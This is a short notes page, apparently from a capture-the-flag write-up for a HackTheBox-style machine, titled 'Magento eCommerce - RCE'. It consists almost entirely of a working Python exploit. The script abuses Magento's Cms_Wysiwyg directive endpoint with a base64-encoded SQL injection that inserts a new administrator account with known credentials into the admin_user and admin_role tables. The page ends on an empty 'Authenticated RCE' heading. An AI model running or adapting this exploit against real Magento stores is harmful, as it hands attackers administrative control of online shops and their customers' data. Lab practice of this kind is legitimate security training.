_____

Magento is _a platform with built-in PHP, which helps programmers create eCommerce websites_

# Magento eCommerce - RCE

```python
import requests
import base64

target_url = "http://swagshop.htb/index.php/admin/Cms_Wysiwyg/directive/index/"
query_template = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

query = query_template.replace("\n", "").format(username="dani", password="dani")
pfilter = f"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{query}"

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is {{block type=Adminhtml/report_search_grid output=getCsvFile}}
directive = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"
encoded_pfilter = base64.b64encode(pfilter.encode()).decode()

response = requests.post(target_url, 
                         data={"___directive": directive,
                               "filter": encoded_pfilter,
                               "forwarded": 1})

if response.ok:
    print("WORKED")
    print(f"Check /admin with creds dani:dani")
else:
    print("DID NOT WORK")
```

# Authenticated RCE

